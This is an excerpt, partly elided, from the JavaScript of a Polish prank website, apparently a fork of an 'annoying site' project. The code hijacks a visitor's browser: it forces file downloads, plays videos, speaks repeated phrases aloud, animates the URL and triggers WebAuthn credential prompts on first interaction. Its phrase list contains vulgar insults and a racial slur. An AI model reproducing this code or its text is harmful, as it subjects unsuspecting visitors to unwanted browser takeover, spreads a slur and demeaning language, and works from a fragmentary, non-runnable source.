/*
  shackwirus.pl
  skided by wojtyker
  credits - https://shackwirus.pl/media/credits.png

  big floppa forker (shackwirus.pl):
  - https://github.com/wojtyker & https://e-z.bio/wojtyker

  person who i skided from jaczup (ptoszek.pl): 
...
const SEARCHES = [
    ...
    'twitch.tubson.pl',
    'ptoszek.pl',
    'duze gowno na srodku pokojo',
    'i wish you a merry mikrocypek',
    'dawidjasper',
    'random stringe yes 69',
    'shackwirus.pl',
    'donosik',
    'mamon na topie yasuo',
    'twoja matka to swinka peepa 100% real',
    'why does rise dont bipas hypickel',
    'how to make loudest fart using my buthole',
    'znowo wysadzili mi dom'
]

const VIDEOS = [
  'media/videos/kaczka1337.mp4',
  'media/videos/8e269d.mp4',
  'media/videos/lv_0_2.mp4',
  'media/videos/ritez.mp4',
  'media/videos/west.mp4'
]

const FILE_DOWNLOADS = [
  'media/images/credits.png',
  'media/images/shack.png',
  'media/images/053.png',
  'media/images/kurwapanstrozok.png',
  'media/images/risecracklol.gif',
  'media/other/dziendoberek.txt',
  'media/other/Duzy.SER',
  'media/other/cypek.png'
]

const PHRASES = [
  'hello my name is kot, lol',
  'hujhujhujhuj lalalalalalalallalala',
  'wgl co u cb bo u mn dbr pzdr',
  'shackkkkkkkkkkkkkkkkkkwirus',
  ...
  'cwel cwel cwel cwel cwel cwel cwel cwel cwel cwel cwel cwel cwel cwel cwel cwel cwel cwel ',
  'hot mikro cypek w twojej okolicy pozdro',
  'niga rap - niga niga niga niga niga niga niga niga im 100procent niga niga niga niga niga'
]
...
function initParentWindow () {
  ...
  interceptUserInput(event => {
    ...
    if (interactionCount === 1) {
      ...
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('mikro cypek hot zdjecia w twojej okolicy tylko na shackwirus.pl')
      speak('mikro cypek hot zdjecia w twojej okolicy tylko na shackwirus.pl')
      speak('mikro cypek hot zdjecia w twojej okolicy tylko na shackwirus.pl')
    }
  })
    ...
    const createCredentialDefaultArgs = {
      ...
      // Relying Party (a.k.a. - Service):
        ...
        user: {
          ...
          name: 'hujhujhuj123@shaackwirus.pl',
          displayName: 'hujhujhuj123'
        },
